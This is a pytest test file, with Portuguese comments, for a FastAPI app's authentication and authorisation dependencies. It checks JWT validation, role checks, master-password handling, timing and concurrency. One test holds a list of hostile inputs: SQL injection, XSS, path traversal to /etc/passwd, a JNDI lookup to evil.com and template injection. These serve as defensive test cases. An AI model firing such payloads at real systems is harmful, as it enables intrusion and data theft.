import pytest
import asyncio
from unittest.mock import Mock, patch, AsyncMock
from fastapi import HTTPException, status
from fastapi.security import HTTPBearer
from sqlalchemy.orm import Session
from datetime import datetime, timedelta
import jwt
import time

from app.dependencies import (
    get_current_user,
    get_current_admin,
    get_current_master,
    require_master_password,
)
from app.models.user import User
from app.core.config import settings
from app.core.security import create_access_token


class TestGetCurrentUser:
    """Testes críticos para get_current_user - função essencial de autenticação"""

    @pytest.fixture
    def mock_db(self):
        return Mock(spec=Session)

    @pytest.fixture
    def valid_user(self):
        user = Mock(spec=User)
        user.id = 1
        user.email = "test@example.com"
        user.is_active = True
        user.is_blocked = False
        user.role = "USER"
        return user

    @pytest.fixture
    def valid_token(self, valid_user):
        return create_access_token(data={"sub": str(valid_user.id)})

    async def test_get_current_user_success(self, mock_db, valid_user, valid_token):
        """Teste: usuário válido com token válido"""
        mock_db.query().filter().first.return_value = valid_user

        result = await get_current_user(valid_token, mock_db)

        assert result == valid_user
        mock_db.query.assert_called_once()

    async def test_get_current_user_invalid_token_format(self, mock_db):
        """Teste: token com formato inválido"""
        invalid_tokens = [
            "invalid_token",
            "Bearer invalid",
            "not.a.jwt",
            "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.invalid",
            "",
            None,
        ]

        for token in invalid_tokens:
            with pytest.raises(HTTPException) as exc_info:
                await get_current_user(token, mock_db)
            assert exc_info.value.status_code == status.HTTP_401_UNAUTHORIZED

    async def test_get_current_user_expired_token(self, mock_db):
        """Teste: token expirado"""
        # Criar token expirado
        expired_token = jwt.encode(
            {"sub": "1", "exp": datetime.utcnow() - timedelta(hours=1)},
            settings.SECRET_KEY,
            algorithm=settings.ALGORITHM,
        )

        with pytest.raises(HTTPException) as exc_info:
            await get_current_user(expired_token, mock_db)
        assert exc_info.value.status_code == status.HTTP_401_UNAUTHORIZED
        assert "expired" in str(exc_info.value.detail).lower()

    async def test_get_current_user_malformed_payload(self, mock_db):
        """Teste: token com payload malformado"""
        malformed_tokens = [
            jwt.encode(
                {"invalid": "payload"},
                settings.SECRET_KEY,
                algorithm=settings.ALGORITHM,
            ),
            jwt.encode(
                {"sub": None}, settings.SECRET_KEY, algorithm=settings.ALGORITHM
            ),
            jwt.encode({"sub": ""}, settings.SECRET_KEY, algorithm=settings.ALGORITHM),
            jwt.encode(
                {"sub": "not_a_number"},
                settings.SECRET_KEY,
                algorithm=settings.ALGORITHM,
            ),
        ]

        for token in malformed_tokens:
            with pytest.raises(HTTPException) as exc_info:
                await get_current_user(token, mock_db)
            assert exc_info.value.status_code == status.HTTP_401_UNAUTHORIZED

    async def test_get_current_user_not_found(self, mock_db, valid_token):
        """Teste: usuário não encontrado no banco"""
        mock_db.query().filter().first.return_value = None

        with pytest.raises(HTTPException) as exc_info:
            await get_current_user(valid_token, mock_db)
        assert exc_info.value.status_code == status.HTTP_401_UNAUTHORIZED

    async def test_get_current_user_inactive(self, mock_db, valid_user, valid_token):
        """Teste: usuário inativo"""
        valid_user.is_active = False
        mock_db.query().filter().first.return_value = valid_user

        with pytest.raises(HTTPException) as exc_info:
            await get_current_user(valid_token, mock_db)
        assert exc_info.value.status_code == status.HTTP_401_UNAUTHORIZED
        assert "inactive" in str(exc_info.value.detail).lower()

    async def test_get_current_user_blocked(self, mock_db, valid_user, valid_token):
        """Teste: usuário bloqueado"""
        valid_user.is_blocked = True
        mock_db.query().filter().first.return_value = valid_user

        with pytest.raises(HTTPException) as exc_info:
            await get_current_user(valid_token, mock_db)
        assert exc_info.value.status_code == status.HTTP_403_FORBIDDEN
        assert "blocked" in str(exc_info.value.detail).lower()

    async def test_get_current_user_database_error(self, mock_db, valid_token):
        """Teste: erro de banco de dados"""
        mock_db.query.side_effect = Exception("Database connection failed")

        with pytest.raises(HTTPException) as exc_info:
            await get_current_user(valid_token, mock_db)
        assert exc_info.value.status_code == status.HTTP_500_INTERNAL_SERVER_ERROR

    async def test_get_current_user_timing_attack_protection(self, mock_db):
        """Teste: proteção contra timing attacks"""
        # Medir tempo para token inválido
        start_time = time.time()
        try:
            await get_current_user("invalid_token", mock_db)
        except HTTPException:
            pass
        invalid_time = time.time() - start_time

        # Medir tempo para usuário não encontrado
        mock_db.query().filter().first.return_value = None
        valid_token = create_access_token(data={"sub": "999"})

        start_time = time.time()
        try:
            await get_current_user(valid_token, mock_db)
        except HTTPException:
            pass
        not_found_time = time.time() - start_time

        # Tempos devem ser similares (diferença < 100ms)
        assert abs(invalid_time - not_found_time) < 0.1


class TestGetCurrentAdmin:
    """Testes críticos para get_current_admin - autorização de administrador"""

    @pytest.fixture
    def admin_user(self):
        user = Mock(spec=User)
        user.id = 1
        user.email = "admin@example.com"
        user.role = "ADMIN"
        user.is_active = True
        user.is_blocked = False
        return user

    @pytest.fixture
    def regular_user(self):
        user = Mock(spec=User)
        user.id = 2
        user.email = "user@example.com"
        user.role = "USER"
        user.is_active = True
        user.is_blocked = False
        return user

    async def test_get_current_admin_success(self, admin_user):
        """Teste: usuário admin válido"""
        with patch("app.dependencies.get_current_user", return_value=admin_user):
            result = await get_current_admin(admin_user)
            assert result == admin_user

    async def test_get_current_admin_insufficient_permissions(self, regular_user):
        """Teste: usuário sem permissões de admin"""
        with pytest.raises(HTTPException) as exc_info:
            await get_current_admin(regular_user)
        assert exc_info.value.status_code == status.HTTP_403_FORBIDDEN
        assert "admin" in str(exc_info.value.detail).lower()

    async def test_get_current_admin_role_escalation_attempt(self):
        """Teste: tentativa de escalação de privilégios"""
        # Simular usuário tentando modificar seu próprio role
        malicious_user = Mock(spec=User)
        malicious_user.role = "USER"

        # Tentar modificar role em runtime
        malicious_user.role = "ADMIN"

        # Função deve verificar role original do banco
        with patch("app.dependencies.get_current_user") as mock_get_user:
            original_user = Mock(spec=User)
            original_user.role = "USER"
            mock_get_user.return_value = original_user

            with pytest.raises(HTTPException) as exc_info:
                await get_current_admin(original_user)
            assert exc_info.value.status_code == status.HTTP_403_FORBIDDEN


class TestGetCurrentMaster:
    """Testes críticos para get_current_master - máxima autorização"""

    @pytest.fixture
    def master_user(self):
        user = Mock(spec=User)
        user.id = 1
        user.email = "master@example.com"
        user.role = "MASTER"
        user.is_active = True
        user.is_blocked = False
        return user

    async def test_get_current_master_success(self, master_user):
        """Teste: usuário master válido"""
        result = await get_current_master(master_user)
        assert result == master_user

    async def test_get_current_master_insufficient_permissions(self):
        """Teste: usuários sem permissões de master"""
        test_users = [
            Mock(role=UserRole.USER),
            Mock(role=UserRole.ADMIN),
            Mock(role=None),
        ]

        for user in test_users:
            with pytest.raises(HTTPException) as exc_info:
                await get_current_master(user)
            assert exc_info.value.status_code == status.HTTP_403_FORBIDDEN
            assert "master" in str(exc_info.value.detail).lower()


class TestRequireMasterPassword:
    """Testes críticos para require_master_password - validação de senha mestra"""

    async def test_require_master_password_success(self):
        """Teste: senha mestra correta"""
        correct_password = settings.MASTER_PASSWORD
        result = await require_master_password(correct_password)
        assert result is True

    async def test_require_master_password_incorrect(self):
        """Teste: senha mestra incorreta"""
        incorrect_passwords = [
            "wrong_password",
            "",
            None,
            "MASTER_PASSWORD",  # Case sensitive
            settings.MASTER_PASSWORD + " ",  # Com espaço
            settings.MASTER_PASSWORD[:-1],  # Faltando último char
        ]

        for password in incorrect_passwords:
            with pytest.raises(HTTPException) as exc_info:
                await require_master_password(password)
            assert exc_info.value.status_code == status.HTTP_403_FORBIDDEN

    async def test_require_master_password_timing_attack_protection(self):
        """Teste: proteção contra timing attacks na validação da senha mestra"""
        correct_password = settings.MASTER_PASSWORD
        wrong_password = "x" * len(correct_password)

        # Medir tempo para senha correta
        start_time = time.time()
        await require_master_password(correct_password)
        correct_time = time.time() - start_time

        # Medir tempo para senha incorreta
        start_time = time.time()
        try:
            await require_master_password(wrong_password)
        except HTTPException:
            pass
        wrong_time = time.time() - start_time

        # Tempos devem ser similares (diferença < 50ms)
        assert abs(correct_time - wrong_time) < 0.05

    async def test_require_master_password_brute_force_protection(self):
        """Teste: proteção contra ataques de força bruta"""
        # Simular múltiplas tentativas incorretas
        for i in range(10):
            with pytest.raises(HTTPException):
                await require_master_password(f"wrong_password_{i}")

        # Ainda deve funcionar com senha correta
        result = await require_master_password(settings.MASTER_PASSWORD)
        assert result is True

    async def test_require_master_password_injection_attempts(self):
        """Teste: tentativas de injeção na validação da senha"""
        injection_attempts = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "\x00\x01\x02",  # Null bytes
        ]

        for attempt in injection_attempts:
            with pytest.raises(HTTPException) as exc_info:
                await require_master_password(attempt)
            assert exc_info.value.status_code == status.HTTP_403_FORBIDDEN


class TestConcurrencyAndRaceConditions:
    """Testes de concorrência e race conditions em funções críticas"""

    async def test_concurrent_authentication_requests(self):
        """Teste: múltiplas requisições de autenticação simultâneas"""
        mock_db = Mock(spec=Session)
        valid_user = Mock(spec=User)
        valid_user.is_active = True
        valid_user.is_blocked = False
        mock_db.query().filter().first.return_value = valid_user

        valid_token = create_access_token(data={"sub": "1"})

        # Executar 50 requisições simultâneas
        tasks = []
        for _ in range(50):
            task = asyncio.create_task(get_current_user(valid_token, mock_db))
            tasks.append(task)

        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Todas devem retornar o mesmo usuário ou falhar consistentemente
        successful_results = [r for r in results if not isinstance(r, Exception)]
        assert len(successful_results) > 0
        assert all(r == valid_user for r in successful_results)

    async def test_master_password_concurrent_validation(self):
        """Teste: validação simultânea da senha mestra"""
        correct_password = settings.MASTER_PASSWORD

        # Executar 20 validações simultâneas
        tasks = []
        for _ in range(20):
            task = asyncio.create_task(require_master_password(correct_password))
            tasks.append(task)

        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Todas devem retornar True
        assert all(r is True for r in results)


class TestSecurityEdgeCases:
    """Testes de casos extremos de segurança"""

    async def test_token_manipulation_attempts(self, mock_db):
        """Teste: tentativas de manipulação de token"""
        # Token com assinatura modificada
        valid_token = create_access_token(data={"sub": "1"})
        parts = valid_token.split(".")
        manipulated_token = f"{parts[0]}.{parts[1]}.modified_signature"

        with pytest.raises(HTTPException) as exc_info:
            await get_current_user(manipulated_token, mock_db)
        assert exc_info.value.status_code == status.HTTP_401_UNAUTHORIZED

    async def test_privilege_escalation_via_token(self, mock_db):
        """Teste: tentativa de escalação via manipulação de token"""
        # Criar token com claims modificados
        malicious_payload = {
            "sub": "1",
            "role": "MASTER",  # Tentativa de injetar role
            "is_admin": True,
            "permissions": ["all"],
        }

        malicious_token = jwt.encode(
            malicious_payload,
            "wrong_secret",  # Chave incorreta
            algorithm=settings.ALGORITHM,
        )

        with pytest.raises(HTTPException) as exc_info:
            await get_current_user(malicious_token, mock_db)
        assert exc_info.value.status_code == status.HTTP_401_UNAUTHORIZED

    async def test_memory_exhaustion_protection(self, mock_db):
        """Teste: proteção contra exaustão de memória"""
        # Token extremamente longo
        huge_token = "a" * 10000

        with pytest.raises(HTTPException) as exc_info:
            await get_current_user(huge_token, mock_db)
        assert exc_info.value.status_code == status.HTTP_401_UNAUTHORIZED
